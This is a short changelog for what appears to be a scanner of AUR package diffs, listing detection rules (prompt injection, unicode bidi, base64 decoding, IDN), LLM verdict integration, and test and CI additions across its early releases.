- R012 (prompt injection) and R013 (unicode bidi) rules
- LLM verdict integrity assertions
- scan_diff offline pipeline for benchmark use
- is_skip_justified analysis for SKIP checksums
- Fix: SKIP checksums no longer count as verification evidence
- Removed R004/R005 from TOML rules (now programmatic, context-aware)
- Default LLM provider changed to openai
- CI workflows for corpus drift monitoring
- 267 tests (was 218)

## [0.2.0] - 2026-07-15

- R004/R005 rule hardening with quote bypass fix
- Tokenizer iteration fix
- Forge classification cap
- IDN detection
- Shell variant coverage
- base64 --decode detection

## [0.1.0] - 2026-07-12

- Initial release
- R001-R011 rules
- AUR diff analysis pipeline
- Deterministic scoring
- SQLite novelty tracking
- LLM verdict integration
- Basic CLI (review, inspect, history, config)
